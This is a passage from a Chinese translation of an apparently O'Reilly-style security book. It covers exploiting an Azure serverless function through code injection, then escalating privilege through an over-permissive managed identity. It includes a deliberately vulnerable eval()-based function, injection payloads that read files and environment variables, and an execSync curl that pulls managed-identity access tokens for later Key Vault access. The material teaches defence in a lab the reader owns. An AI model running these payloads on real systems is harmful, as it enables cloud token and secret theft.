  \ .id, value: .value}'\ndone\n```\n\n输出如下所示：\n\n```\n{\n  \"name\": \"https://keyvault....vault.azure.net/secrets/secret00/...\"\
  ,\n  \"value\": \"SECRETABC123\"\n}\n{\n  \"name\": \"https://keyvault....vault.azure.net/secrets/secret01/...\"\
  ,\n  \"value\": \"SECRETDEF456\"\n}\n```\n\n#### Note\n\n从这里开始，攻击者可以使用窃取的密钥访问依赖于这些密钥的其他服务或资源。\n\
  \n到目前为止，你应该更好地理解了过度宽松的托管标识以及易受攻击的函数代码如何将存储在 Key Vault 中的密钥暴露给攻击者。你了解到，即使使用了密钥管理服务，攻击者也可以利用应用程序代码或权限中的弱点来窃取密钥。\n\
  \n从防御安全角度来看，你应定期审查和限制访问权限，并为托管标识强制执行最小权限原则，以限制访问令牌被泄露时的潜在影响并降低对敏感资源进行未经授权访问的风险。此外，你应确保函数免受代码注入漏洞的保护，以便攻击者无法执行任意代码来窃取密钥或提升权限。\n\
  \n#### Caution\n\n不要立即清理你的资源，因为它们将在 第 12 章 的动手示例和模拟中用到。\n\n## Summary\n\n在本节中，你探讨了攻击者如何利用在\
  \ Azure 上运行的无服务器应用程序中的配置错误和漏洞。你首先部署了一个易受攻击的 Azure 函数，并模拟了攻击者利用该函数中的代码注入漏洞。为了加快安全测试模拟，你创建并使用了一个自定义脚本，该脚本通过\
  \ REPL 自动发送恶意负载。你还在 Azure Key Vault 中存储了密钥，并研究了代码注入漏洞与过度宽松的托管标识结合起来如何被滥用来窃取这些密钥。\n\
  \n在下一节中，你将深入研究 Azure 中的权限提升，探讨与易受攻击的函数应用绑定的过度宽松托管标识如何被滥用。你将模拟提取函数应用的托管标识访问令牌，然后使用该令牌提升到\
  \ Owner 级别权限并从 Azure Key Vault 读取密钥。\n\n^1 你可以在 [CLI 项目仓库](https://oreil.ly/FpXNT)\
  \ 中了解更多关于 Azure CLI 的信息。\n\n^2 由于 `$RANDOM` 的值每次调用时都会改变，如果你计划将其用作云资源名称的一部分，则应将其返回的数字存储在单独的变量中。\n\
  \n\n\n\n\n`Standard_LRS` 指的是本地冗余存储冗余选项。在此配置下，数据在单个 Azure 区域内复制三次，但不会跨区域复制。这可确保抵御硬件故障的耐久性，但不提供地理冗余。\n\
  \n如果您遇到 `MissingSubscriptionRegistration` 错误，请通过运行命令 `az provider register --namespace\
  \ Microsoft.Web` 注册所需的资源提供程序。有关更多详细信息和故障排除指导，请参阅 [Microsoft 文档](https://oreil.ly/4BYHX)。\n\
  \n截至撰写本文时，Azure Functions v4 支持 Node.js 20 和 Node.js 22。您可以在 [“Azure Functions Runtime\
  \ Versions Overview” 页面](https://oreil.ly/N5XVV) 上查看在创建函数应用时支持的语言和语言版本。\n\n本章假设您使用的是\
  \ `func` 版本 4.0.X。更具体地说，本章中的动手示例是使用版本 4.0.7317 准备的。\n\n在本章中，我们使用 Ruby 进行演示，但您可以使用任何您熟悉的编程语言，例如\
  \ Python。\n\n如果您遇到 `MissingSubscriptionRegistration` 错误，请通过运行命令 `az provider register\
  \ --namespace 'Microsoft.KeyVault'` 注册所需的资源提供程序。有关更多详细信息和故障排除指导，请参阅 [Microsoft 文档](https://oreil.ly/4BYHX)。\n\
  \n您可以在 [“Azure Role-Based Access Control (Azure RBAC) vs. Access Policies (Legacy)”\
  \ 页面](https://oreil.ly/8QADb) 上查看更多信息。\n\n*principal ID* 在 Azure 中唯一标识一个安全主体，例如托管标识，用于在分配和管理资源权限时使用。\n\
  \n有关 Azure Key Vault RBAC 和内置角色的更多详细信息，请参阅 [Azure RBAC guide](https://oreil.ly/PFrQy)。\n\
  \n本章假设您使用的是 `@azure/identity` `⁴.12.0` 和 `@azure/keyvault-secrets` `⁴.10.0`。\n\n\
  这反映了 Azure 中管理平面和数据平面之间的差异。*管理平面* 处理创建或配置资源等操作。*数据平面* 处理对资源实际内容的实际操作，例如在 Key Vault\
  \ 中读取或写入密钥。访问令牌的范围取决于您想要交互的平面而有所不同。\n"
- "## 第 12 章. 在 Microsoft Azure 中提升权限\n\n在上一章的模拟中，您利用了无服务器函数中的代码注入漏洞，获取了与该函数托管标识关联的访问令牌，该标识具有\
  \ Owner 级别权限。实际上，大多数与无服务器函数和其他支持无服务器操作模型的云资源关联的托管标识被授予的访问权限要有限得多。\n\n在本章中，您将在所学知识的基础上，探讨攻击者如何通过滥用过于宽松的托管标识在\
  \ Azure 中提升权限。您将首先升级之前设置的有意易受攻击的无服务器函数，并将其托管标识配置为更严格的角色集。接下来，您将执行模拟攻击并通过代码注入提取函数应用的托管标识令牌，通过管理平面分配提升的角色来提升权限，然后从\
  \ Key Vault 访问密钥。最后，您将通过删除任何不必要的角色分配来保护函数，以强制执行最小权限原则。\n\n本章将涵盖以下内容：\n\n*   “Updating\
  \ the Function App Permissions”\n*   “Escalating Privileges Through an Overly Permissive\
  \ Managed Identity”\n*   “Applying Least Privilege to the Function App Managed Identity”\n\
  \n到本章结束时，您应该能够识别可能允许攻击者在 Azure 中提升权限的配置错误。这将帮助您在发生之前防止权限提升并加强 Azure 无服务器应用程序的整体安全态势。\n\
  \n### Reviewing Technical Prerequisites\n\n要跟随本章，您需要以下内容：\n\n*   在本地计算机上安装的代码编辑器（例如\
  \ VS Code 或 Sublime Text）\n*   两个 Microsoft Azure 账户：一个用于设置和托管易受攻击的无服务器实验室环境（Serverless\
  \ Lab 账户），另一个用于运行模拟利用（Attacker 账户）\n\n在跟随本章时，请确保两个账户都已准备就绪并在单独的浏览器会话（或隐身/隐私窗口）中打开，以避免会话冲突。\n\
  \n#### Note\n\n为了帮助您完成练习和模拟，本章中使用的代码和命令的副本可在 [GitHub gist（见 `ch12.md`）](https://oreil.ly/0mSPU)\
  \ 中获得。\n\n### Updating the Function App Permissions\n\n在本节中，您将更新函数应用托管标识的角色分配，用更不宽松的一组角色\
  \ Contributor 和 User Access Administrator 替换其当前分配的角色 Owner 和 Key Vault Secrets Officer。请记住，虽然这些角色权限更低，但攻击者如果利用无服务器函数中的代码注入漏洞，可能会利用托管标识的权限来提升权限（Figure 12-1）。\n\
  \n由于函数应用的托管标识不再具有对 Key Vault 的访问权限，您还将相应地更新 `evaluate` 函数代码，然后重新部署该函数。\n\n![](img/lsse_1201.png)\n\
  \n在动手操作之前，让我们讨论本章的几个关键术语：\n\nManaged identity\n\n: \n\n分配给 Azure 资源以便在不将凭据存储在代码中的情况下对其他\
  \ Azure 服务进行身份验证的标识。这类似于给员工一张公司 ID 卡，该卡可自动授予其访问批准的房间和资源的权限，而无需为每扇门准备单独的钥匙。在此类比中，托管标识是公司\
  \ ID 卡，而 Azure 资源，例如无服务器函数，则是使用它访问其他服务和资源的员工。\n\nSubscription\n\n: \n\n在该 Azure\
  \ 账户下创建和计费资源的 Azure 账户。继续这个类比，订阅就像管理 ID 卡（托管标识）的公司，并决定哪些员工（Azure 资源）可以访问哪些房间和资源。\n\
  \nSubscription ID\n\n: \n\nAzure 订阅的唯一标识符。订阅 ID 就像公司的注册号或税号，唯一标识它与其他公司不同。\n\nPrincipal\n\
  \n: \n\n可以分配角色以访问资源的安全实体，例如用户、组或托管标识。您可以将主体视为可以被授予访问公司资源和进入建筑物特定房间权限的任何人（或任何事物）。\n\
  \nPrincipal ID\n\n: \n\n主体的唯一标识符。您可以将其视为唯一的员工 ID 或徽章号码，用于区分一个人或服务，即使多个主体具有相似的名称或角色。\n\
  \nRole assignment\n:\n\n\n\n\n\n主体的关联与角色，定义主体可以在资源上执行的操作。延展这个类比，角色分配就像为员工授予对建筑物中房间或资源的特定权限，允许他们根据其职责进入服务器机房、使用复印机或访问人力资源文件。公司的创始人或总裁随后将被分配\
  \ `Owner` 角色，使其对所有房间和资源拥有完全控制权。\n\n#### Scope\n\n角色分配适用的资源集合，例如资源、资源组或订阅。在类比中，范围就像员工访问权限适用的建筑物中的特定房间或楼层，精确定义他们可以使用其\
  \ ID 卡的位置。\n\n这些关键术语是管理 Azure 中访问和特权的基础。理解它们对于防止可能导致权限提升的错误配置至关重要。\n\n#### Note\n\
  \n本节假定您正在使用您的 Serverless Lab 账户，该账户托管您在前一章中准备的有意易受攻击的无服务器实验室资源。\n\n让我们现在更新函数应用权限：\n\
  \n1. 切换回 Serverless Lab 账户的 Cloud Shell 终端。\n\n2. 运行以下命令（`$` 符号之后）以检索函数应用托管标识的主体\
  \ ID 并将其存储在环境变量（`PRINCIPAL_ID`）中：\n\n```\nsource ~/vulnerable-function/function-vars.sh\n\
  \nDETAILS=$(az functionapp identity show \\\n  --name $FUNCTION_APP \\\n  --resource-group\
  \ $RESOURCE_GROUP)\n\nPRINCIPAL_ID=$(echo $DETAILS | jq -r \".principalId\")\n```\n\
  \n您可以运行 `echo $PRINCIPAL_ID` 来打印主体 ID 并确保其已成功检索。\n\n3. 列出函数应用托管标识（使用其主体 ID）的所有角色分配，以验证其当前权限：\n\
  \n```\naz role assignment list \\\n  --assignee $PRINCIPAL_ID \\\n  --all \\\n \
  \ -o table\n```\n\n这会返回以下值表：\n\n```\nPrincipal  Role                       Scope\n\
  ---------  -------------------------  -------------------------\n...        Key\
  \ Vault Secrets Officer  /.../vaults/keyvault...\n...        Owner             \
  \         /subscriptions/...\n```\n\n此标识同时被分配了 Key Vault Secrets Officer 角色（范围限定于\
  \ Key Vault）和 Owner 角色（范围限定于订阅）。\n\n4. 以 JSON 格式列出函数应用托管标识的所有角色分配，然后仅显示主体 ID、角色和范围：\n\
  \n```\naz role assignment list \\\n  --assignee $PRINCIPAL_ID \\\n  --all \\\n \
  \ -o json | \\\n  jq '[.[] |\n        { principal: .principalId,\n          role:\
  \ .roleDefinitionName,\n          scope: .scope }]'\n```\n\n运行命令会得到以下 JSON 输出：\n\
  \n```\n[\n  {\n    \"principal\": \"...\",\n    \"role\": \"Key Vault Secrets Officer\"\
  ,\n    \"scope\": \"/.../vaults/keyvault...\"\n  },\n  {\n    \"principal\": \"\
  ...\",\n    \"role\": \"Owner\",\n    \"scope\": \"/subscriptions/...\"\n  }\n]\n\
  ```\n\n5. 将托管标识的完整角色分配列表存储在环境变量（`ASSIGNMENT_LIST_FULL`）中，然后输出每个分配的 `principalId`、`roleDefinitionName`\
  \ 和 `scope` 值：\n\n```\nASSIGNMENT_LIST_FULL=$(az role assignment list \\\n  --assignee\
  \ $PRINCIPAL_ID \\\n  --all \\\n  -o json)\n\nASSIGNMENT_LIST=$(echo $ASSIGNMENT_LIST_FULL\
  \ | \\\n  jq '[.[] |\n        { principal: .principalId,\n          role: .roleDefinitionName,\n\
  \          scope: .scope }]')\n\necho $ASSIGNMENT_LIST | jq .\n```\n\n这会产生以下 JSON\
  \ 输出：\n\n```\n[\n  {\n    \"principal\": \"...\",\n    \"role\": \"Key Vault Secrets\
  \ Officer\",\n    \"scope\": \"/.../vaults/keyvault...\"\n  },\n  {\n    \"principal\"\
  : \"...\",\n    \"role\": \"Owner\",\n    \"scope\": \"/subscriptions/...\"\n  }\n\
  ]\n```\n\n6. 运行以下代码块以删除托管标识的每个角色分配：\n\n```\necho \"$ASSIGNMENT_LIST\" | jq -c '.[]'\
  \ | while read assignment; do\n    PRINCIPAL=$(echo \"$assignment\" | jq -r '.principal')\n\
  \    ROLE=$(echo \"$assignment\" | jq -r '.role')\n    SCOPE=$(echo \"$assignment\"\
  \ | jq -r '.scope')\n\n    echo \"Deleting role assignment: $ROLE for principal\
  \ $PRINCIPAL on $SCOPE\"\n\n    az role assignment delete \\\n        --assignee\
  \ \"$PRINCIPAL\" \\\n        --role \"$ROLE\" \\\n        --scope \"$SCOPE\"\ndone\n\
  ```\n\n几秒钟后，您应该会得到以下日志输出：\n\n```\nDeleting role assignment: Key Vault Secrets Officer\
  \ for principal ... on\n/.../.../providers/Microsoft.KeyVault/vaults/keyvault...\n\
  Deleting role assignment: Owner for principal ... on /subscriptions/...\n```\n\n\
  7. 通过再次列出托管标识的所有角色分配来验证角色分配是否已成功删除：\n\n```\naz role assignment list \\\n  --assignee\
  \ $PRINCIPAL_ID \\\n  --all \\\n  -o json\n```\n\n运行命令返回 `[]`。\n\n8. 检索与函数应用托管标识关联的主体\
  \ ID 和订阅 ID，并将它们存储在其各自的变量（`PRINCIPAL_ID` 和 `SUBSCRIPTION_ID`）中：\n\n```\nsource ~/vulnerable-function/function-vars.sh\n\
  \nDETAILS=$(az functionapp identity show \\\n  --name $FUNCTION_APP \\\n  --resource-group\
  \ $RESOURCE_GROUP)\n\nPRINCIPAL_ID=$(echo $DETAILS | jq -r \".principalId\")\n\n\
  SUBSCRIPTION_ID=$(az account show --query id -o tsv)\n```\n\n9. 在订阅范围内向托管标识分配 Contributor\
  \ 角色：\n\n```\naz role assignment create \\\n  --assignee $PRINCIPAL_ID \\\n  --role\
  \ \"Contributor\" \\\n  --scope /subscriptions/$SUBSCRIPTION_ID\n```\n\n10. 在订阅范围内向托管标识分配\
  \ User Access Administrator 角色：\n\n```\naz role assignment create \\\n  --assignee\
  \ $PRINCIPAL_ID \\\n  --role \"User Access Administrator\" \\\n  --scope /subscriptions/$SUBSCRIPTION_ID\n\
  ```\n\n11. 验证角色分配是否已成功应用：\n\n```\nASSIGNMENT_LIST_FULL=$(az role assignment list\
  \ \\\n  --assignee $PRINCIPAL_ID \\\n  --all \\\n  -o json)\n\nASSIGNMENT_LIST=$(echo\
  \ $ASSIGNMENT_LIST_FULL | \\\n  jq '[.[] |\n        { principal: .principalId,\n\
  \          role: .roleDefinitionName,\n          scope: .scope }]')\n\necho $ASSIGNMENT_LIST\
  \ | jq .\n```\n\n这会产生以下 JSON 输出：\n\n```\n[\n  {\n    \"principal\": \"...\",\n \
  \   \"role\": \"Contributor\",\n    \"scope\": \"/subscriptions/...\"\n  },\n  {\n\
  \    \"principal\": \"...\",\n    \"role\": \"User Access Administrator\",\n   \
  \ \"scope\": \"/subscriptions/...\"\n  }\n]\n```\n\n12. 在 Cloud Shell 代码编辑器中打开 `vulnerable-function/src/functions/evaluate.js`。用以下有意易受攻击的表达式求值代码替换文件内容：\n\
  \n```\nconst { app } = require('@azure/functions');\n\nconst HARDCODED_KEY = \"\
  67890ghijkl\";\n\napp.http('evaluate', {\n  methods: ['POST'],\n  authLevel: 'function',\n\
  \  handler: async (request, context) => {\n    const expression = await request.text()\
  \ || '\"No expression provided\"';\n\n    let result;\n    try {\n      result =\
  \ eval(expression);\n    } catch (err) {\n      result = `Error: ${err.message}`;\n\
  \    }\n\n    return { body: `Evaluation result: ${result}` };\n  }\n});\n```\n\n\
  #### Caution\n\n更新 `evaluate.js` 文件后，请务必在继续下一步之前保存更改。\n\n\n\n\n\n13. 在终端中运行以下命令（在\
  \ `$` 符号之后）以部署函数中的最新更改：\n\n```\ncd ~/vulnerable-function\nsource function-vars.sh\n\
  \nfunc azure functionapp publish $FUNCTION_APP\n```\n\n14. 从前一个命令（`func azure functionapp\
  \ publish`）的输出中复制函数的 Invoke URL 并将其存储在 `INVOKE_URL` 环境变量中：\n\n```\nINVOKE_URL=\"\
  [SPECIFY INVOKE URL]\"\n```\n\n#### Caution\n\n在运行命令之前，请确保将 `[SPECIFY INVOKE URL]`\
  \ 替换为 Invoke URL 值。\n\n15. 获取并显示函数应用中 `evaluate` 函数的函数密钥：\n\n```\nKEY=$(az functionapp\
  \ function keys list \\\n  --resource-group $RESOURCE_GROUP \\\n  --name $FUNCTION_APP\
  \ \\\n  --function-name evaluate)\n\necho $KEY\n```\n\n这会产生以下 JSON 输出：\n\n```\n\
  {\n  \"default\": \"...\",\n  \"id\": null,\n  \"kind\": null,\n  \"name\": null,\n\
  \  \"properties\": null,\n  \"type\": null\n}\n```\n\n16. 从检索到的密钥中提取默认函数密钥并将其打印到终端：\n\
  \n```\nFUNCTION_KEY=$(echo $KEY | jq -r \".default\")\necho $FUNCTION_KEY\n```\n\
  \n17. 通过发送包含简单表达式（如 `4+2`）的 `POST` 请求来测试 `evaluate` 函数：\n\n```\ncurl -X POST \"\
  $INVOKE_URL?code=$FUNCTION_KEY\" \\\n  -H \"Content-Type: text/plain\" \\\n  -d\
  \ \"4+2\"\n```\n\n这应成功计算表达式并产生以下输出：\n\n```\nEvaluation result: 6\n```\n\n18. 使用另一个有效表达式（如\
  \ `(2 + 9) * (6 / 4)`）测试 `evaluate` 函数：\n\n```\ncurl -X POST \"$INVOKE_URL?code=$FUNCTION_KEY\"\
  \ \\\n  -H \"Content-Type: text/plain\" \\\n  -d \"(2 + 9) * (6 / 4)\"\n```\n\n\
  这应给出以下计算输出：\n\n```\nEvaluation result: 16.5\n```\n\n现在你的更新后的易受攻击的按需服务器 less 函数已准备就绪，你可以继续进行下一节，探索在当前角色分配（Contributor\
  \ 和 User Access Administrator）下如何提升权限。\n\n### 通过过度宽松受管标识提升权限\n\n在 Chapter 11 中，在利用易受攻击的服务器\
  \ less 函数后，你获得了并使用了一个具有 Owner 级别权限的访问令牌以及其他授予的角色来访问云账户中的其他资源。实际上，大多数与服务器 less 函数和其他云资源关联的受管标识被授予的访问权限要受限得多。在本节中，你将使用一个具有较低级别权限的访问令牌，并寻求提升权限以获得\
  \ Owner 级别访问。\n\n你可以将攻击者想象成佩戴低权限 ID 徽章的入侵者，他试图欺骗建筑工作人员或系统发放主徽章。入侵者从有限的访问权限开始（徽章只能打开几扇门），然后寻找提升该访问权限的方法，以便进入任何房间并窃取机密信息。\n\
  \n#### Note\n\n本节假设你主要从 Attacker 账户工作。然而，一些步骤可能需要你切换到 Serverless Lab 账户或参考本地机器上包含之前复制值的文本文件。\n\
  \n让我们逐步了解与易受攻击的服务器 less 函数关联的过度宽松受管标识如何导致权限提升：\n\n1. 在本地机器上创建一个文本文件并添加以下占位符以供以后使用：\n\
  \n```\nSUBSCRIPTION_ID=\"\"\nACCESS_TOKEN=\"\"\nACCESS_TOKEN_2=\"\"\nRESOURCE_GROUP=\"\
  \"\n```\n\n#### Note\n\n现在先将占位符留空。你将在完成即将到来的步骤时填写它们。\n\n2. 从 Serverless Lab 账户的\
  \ Cloud Shell 终端复制 Invoke URL 和 Function Key 的值。切换到 Attacker 账户的 Cloud Shell 终端并将这些值存储在其对应的环境变量（`INVOKE_URL`\
  \ 和 `FUNCTION_KEY`）中，因为你将在后续命令中使用它们：\n\n```\nINVOKE_URL=\"[SPECIFY INVOKE URL]\"\
  \nFUNCTION_KEY=\"[SPECIFY FUNCTION KEY]\"\n```\n\n#### Caution\n\n在运行命令之前，请将占位符替换为实际的\
  \ Invoke URL 和 Function Key 值。\n\n3. 运行你在上一章准备的 `tester.rb` 脚本：\n\n```\nexport INVOKE_URL=$INVOKE_URL\n\
  export FUNCTION_KEY=$FUNCTION_KEY\n\nruby tester.rb\n```\n\n4. 在脚本的 REPL 中，在 `Enter\
  \ an expression (or type 'exit' to quit)` 之后，首先输入一个有效的数学表达式供函数计算：\n\n```\n(2 + 2)\
  \ * 3\n```\n\n这应成功计算输入表达式并产生以下输出：\n\n```\n[OUTPUT RESPONSE] Evaluation result: 12\n\
  ```\n\n让我们现在检查上一章中的一些恶意表达式是否仍然有效。列出当前目录中的所有文件和目录：\n\n```\nrequire('fs').readdirSync('./')\n\
  ```\n\n这会产生以下输出：\n\n```\n[OUTPUT RESPONSE] package-lock.json,...,host.json,node_modules,src\n\
  ```\n\n列出 `src` 文件夹内的所有文件和目录：\n\n```\nrequire('fs').readdirSync('./src')\n```\n\n\
  这会产生以下输出：\n\n```\n[OUTPUT RESPONSE] Evaluation result: functions\n```\n\n列出 `src/functions`\
  \ 目录内的所有文件：\n\n```\nrequire('fs').readdirSync('./src/functions')\n```\n\n你应该在输出中看到\
  \ `evaluate.js` 文件，类似于以下内容：\n\n```\n[OUTPUT RESPONSE] Evaluation result: evaluate.js\n\
  ```\n\n读取 `src/functions` 目录中 `evaluate.js` 的内容：\n\n```\nrequire('fs').readFileSync('./src/functions/evaluate.js',\
  \ 'utf8')\n```\n\n这会给你函数的源代码：\n\n```\n[OUTPUT RESPONSE] const { app } = require('@azure/functions');\n\
  \nconst HARDCODED_KEY = \"67890ghijkl\";\n\napp.http('evaluate', {\n    methods:\
  \ ['POST'],\n    authLevel: 'function',\n    handler: async (request, context) =>\
  \ {\n        const expression = await request.text() || '\"...\"';\n\n        let\
  \ result;\n        try {\n            result = eval(expression);\n        } catch\
  \ (err) {\n            result = `Error: ${err.message}`;\n        }\n\n        return\
  \ { body: `Evaluation result: ${result}` };\n    }\n});\n```\n\n检索环境变量：\n\n```\n\
  JSON.stringify(process.env)\n```\n\n这会产生以下输出：\n\n```\n[OUTPUT RESPONSE]\n{\n  \"\
  ALLUSERSPROFILE\": \"C:\\\\local\\\\ProgramData\",\n  \"APPDATA\": \"C:\\\\local\\\
  \\AppData\",\n  \"APPLICATIONINSIGHTS_CONNECTION_STRING\": \"...,\n  \"APPSETTING_APPLICATIONINSIGHTS_CONNECTION_STRING\"\
  : \"...\",\n  \"APPSETTING_AzureWebJobsStorage\": \"...\",\n  \"APPSETTING_FUNCTIONS_EXTENSION_VERSION\"\
  : \"~4\",\n  \"APPSETTING_FUNCTIONS_WORKER_RUNTIME\": \"node\",\n  \"APPSETTING_SAMPLE_API_KEY\"\
  : \"12345abcdef\",\n\n  ...\n\n  \"WEBSITE_SITE_NAME\": \"functionapp...\",\n  \"\
  WEBSITE_SKU\": \"Dynamic\",\n  \"WEBSITE_SLOT_NAME\": \"Production\",\n  \"WEBSITE_VOLUME_TYPE\"\
  : \"AzureFiles\",\n  \"WEBSOCKET_CONCURRENT_REQUEST_LIMIT\": \"35\",\n  \"windir\"\
  : \"C:\\\\Windows\",\n  \"WORKER_INDEXING_ENABLED\": \"1\"\n}\n```\n\n现在，使用以下命令检索订阅\
  \ ID，然后将结果值（在 `[OUTPUT RESPONSE]` 之后）复制到本地文本文件（TAG：`SUBSCRIPTION_ID`）中，因为你在即将到来的步骤中需要它：\n\
  \n```\nprocess.env[\"WEBSITE_OWNER_NAME\"]?.split('+')[0]\n```\n\n\n\n\n\n作为单行运行此命令，使用托管标识获取访问令牌。将输出值（`[OUTPUT\
  \ RESPONSE]`之后）复制到本地文本文件（TAG：`ACCESS_TOKEN`）中，因为您将在后续步骤中使用它：\n\n```\nrequire(\"\
  child_process\").execSync(\n   `curl -s -H \"X-IDENTITY-HEADER: ${process.env.IDENTITY_HEADER}\"\
  \n   \"${process.env.IDENTITY_ENDPOINT}\n   ?resource=https://management.azure.com/&api-version=2019-08-01\"\
  `,\n   { encoding: \"utf8\" }\n);\n```\n\n这会返回以下输出响应：\n\n```\n{\n  \"access_token\"\
  : \"...\",\n  \"expires_on\": \"...\",\n  \"resource\": \"https://management.azure.com/\"\
  ,\n  \"token_type\": \"Bearer\",\n  \"client_id\": \"...\"\n}\n```\n\n作为单行运行此命令，使用托管标识获取访问令牌。将输出值（`[OUTPUT\
  \ RESPONSE]`之后）复制到本地文本文件（TAG：`ACCESS_TOKEN_2`）中，因为您将在后续步骤中使用它：\n\n```\nrequire(\"\
  child_process\").execSync(\n   `curl -s -H \"X-IDENTITY-HEADER: ${process.env.IDENTITY_HEADER}\"\
  \n   \"${process.env.IDENTITY_ENDPOINT}\n   ?resource=https://vault.azure.net/&api-version=2019-08-01\"\
  `,\n   { encoding: \"utf8\" }\n);\n```\n\n这会产生以下输出：\n\n```\n{\n  \"access_token\"\
  : \"...\",\n  \"expires_on\": \"...\",\n  \"resource\": \"https://vault.azure.net/\"\
  ,\n  \"token_type\": \"Bearer\",\n  \"client_id\": \"...\"\n}\n```\n\n检索资源组名称并将输出值（`[OUTPUT\
  \ RESPONSE]`之后）复制到本地文本文件（TAG：`RESOURCE_GROUP`）：\n\n```\nprocess.env.WEBSITE_RESOURCE_GROUP\n\
  ```\n\n这会产生以下输出：\n\n```\n[OUTPUT RESPONSE] rg-serverless-security-lab\n```\n\n输入\
  \ `exit` 并按 Enter 停止脚本并返回到命令行。\n\n此时，您本地机器中的参考文本文件应具有以下内容：`SUBSCRIPTION_ID`、`ACCESS_TOKEN`、`ACCESS_TOKEN_2`\
  \ 和 `RESOURCE_GROUP`。您将在后续步骤中使用这些值来模拟通过过度授权的托管标识进行的权限提升：\n\n```\nSUBSCRIPTION_ID=\"\
  ...\"\nACCESS_TOKEN=\"...\"\nACCESS_TOKEN_2=\"...\"\nRESOURCE_GROUP=\"rg-serverless-security-lab\"\
  \n```\n\n#### Tip\n\n由于参考文本文件已经像 shell 脚本一样结构化，初始化了四个环境变量，因此您可以直接将这些行复制并粘贴到 Cloud\
  \ Shell 终端中以设置它们，而无需在下一步中进行额外编辑。\n\n让我们继续在 Cloud Shell 终端（攻击者账户）中您离开的地方，以执行权限提升模拟的剩余步骤：\n\
  \n1. 从参考文本文件中复制第一个访问令牌值（TAG：`ACCESS_TOKEN`）并将其存储在 Cloud Shell 终端中的环境变量（`ACCESS_TOKEN`）中：\n\
  \n```\nACCESS_TOKEN=\"[SPECIFY ACCESS TOKEN]\"\n```\n\n2. 从参考文本文件中复制第二个访问令牌值（TAG：`ACCESS_TOKEN_2`）并将其存储在\
  \ Cloud Shell 终端中的环境变量（`ACCESS_TOKEN_2`）中：\n\n```\nACCESS_TOKEN_2=\"[SPECIFY ACCESS\
  \ TOKEN]\"\n```\n\n3. 从参考文本文件中复制检索到的 Azure 订阅 ID 值（TAG：`SUBSCRIPTION_ID`）并将其存储在\
  \ Cloud Shell 终端中的环境变量（`SUBSCRIPTION_ID`）中：\n\n```\nSUBSCRIPTION_ID=\"[SPECIFY SUBSCRIPTION\
  \ ID]\"\n```\n\n4. 从参考文本文件中复制检索到的资源组值（TAG：`RESOURCE_GROUP`）并将其存储在 Cloud Shell 终端中的环境变量（`RESOURCE_GROUP`）中：\n\
  \n```\nRESOURCE_GROUP=\"rg-serverless-security-lab\"\n```\n\n5. 使用第一个访问令牌（`ACCESS_TOKEN`）查询订阅中的所有\
  \ Key Vault：\n\n```\nURL_PART1=\"https://management.azure.com/subscriptions/$SUBSCRIPTION_ID\"\
  \nURL_PART2=\"providers/Microsoft.KeyVault/vaults?api-version=2022-07-01\"\n\nRESPONSE=$(curl\
  \ -s -H \"Authorization: Bearer $ACCESS_TOKEN\" \\\n     -H \"Content-Type: application/json\"\
  \ \\\n     \"$URL_PART1/$URL_PART2\")\n\necho $RESPONSE | jq \".\"\n```\n\n这会输出以下内容：\n\
  \n```\n{\n  \"value\": [\n    {\n      \"id\": \"/.../vaults/keyvault...\",\n  \
  \    \"name\": \"keyvault...\",\n      \"type\": \"Microsoft.KeyVault/vaults\",\n\
  \      \"location\": \"eastus\",\n      \"tags\": {},\n      \"systemData\": {...},\n\
  \      \"properties\": {\n        \"sku\": {\n          \"family\": \"A\",\n   \
  \       \"name\": \"standard\"\n        },\n        \"tenantId\": \"...\",\n   \
  \     \"accessPolicies\": [],\n        \"enabledForDeployment\": false,\n      \
  \  \"enableSoftDelete\": true,\n        \"softDeleteRetentionInDays\": 90,\n   \
  \     \"enableRbacAuthorization\": true,\n        \"vaultUri\": \"...\",\n     \
  \   \"provisioningState\": \"Succeeded\",\n        \"publicNetworkAccess\": \"Enabled\"\
  \n      }\n    }\n  ],\n  \"nextLink\": \"...\"\n```\n\n6. 从响应中提取 Key Vault 名称并将其存储在环境变量（`KEYVAULT_NAME`）中：\n\
  \n```\nKEYVAULT_NAME=$(echo $RESPONSE | jq -r \".value.[].name\")\n```\n\n7. 使用新的访问令牌列出\
  \ Key Vault 中的所有机密并显示其元数据：\n\n```\nURL=\"https://${KEYVAULT_NAME}.vault.azure.net/secrets?api-version=7.5\"\
  \n\ncurl -s -H \"Authorization: Bearer $ACCESS_TOKEN_2\" \\\n     -H \"Content-Type:\
  \ application/json\" \\\n     \"$URL\" | jq .\n```\n\n这会给您以下错误消息：\n\n```\n{\n  \"\
  error\": {\n    \"code\": \"Forbidden\",\n    \"message\": \"Caller is not authorized\
  \ to perform action on resource...\",\n    \"innererror\": {\n      \"code\": \"\
  ForbiddenByRbac\"\n    }\n  }\n}\n```\n\n8. 解码 JSON Web Token（JWT）访问令牌以以 JSON 格式检查其负载：\n\
  \n```\necho $ACCESS_TOKEN | cut -d \".\" -f2 | base64 --decode | jq .\n```\n\n这会产生以下输出：\n\
  \n```\n{\n  \"aud\": \"...\",\n  \"iss\": \"...\",\n  \"iat\": ...,\n  \"nbf\":\
  \ ...,\n  \"exp\": ...,\n  \"aio\": \"...\",\n  \"appid\": \"...\",\n  \"appidacr\"\
  : \"...\",\n  \"idp\": \"...\",\n  \"idtyp\": \"app\",\n  \"oid\": \"...\",\n  \"\
  rh\": \"...\",\n  \"sub\": \"...\",\n  \"tid\": \"...\",\n  \"uti\": \"...\",\n\
  \  \"ver\": \"1.0\",\n  \"xms_ftd\": \"...\",\n  \"xms_idrel\": \"...\",\n  \"xms_mirid\"\
  : \"/.../rg-serverless-security-lab/.../functionapp...\",\n  \"xms_rd\": \"...\"\
  ,\n  \"xms_tcdt\": \"...\"\n}\n```\n\n下表更详细地介绍了这些访问令牌声明中的一些内容：\n\n| Claim || Description\
  \ |\n\n| --- | --- |\n\n| `aud` || 令牌的预期受众/接收者 |\n\n| --- | --- |\n\n| `iss` ||\
  \ 令牌的发行者 |\n\n| `iat` || Issued At 时间戳（令牌签发时间） |\n\n| `nbf` || Not Before 时间戳（令牌生效时间）\
  \ |\n\n| `exp` || 过期时间戳（令牌不再有效的时间） |\n\n| `aio` || 用于令牌处理的内部 Azure AD 声明 |\n\n|\
  \ `appid` || 发行令牌的客户端的应用程序 ID |\n\n| `appidacr` || 用于验证应用的方法 |\n\n| `idp` || 对令牌主体进行身份验证的身份提供者\
  \ |\n\n| `idtyp` || 标识令牌是应用（或应用+用户）令牌 |\n\n| `oid` || 用户或服务主体的对象 ID |\n\n| `rh`\
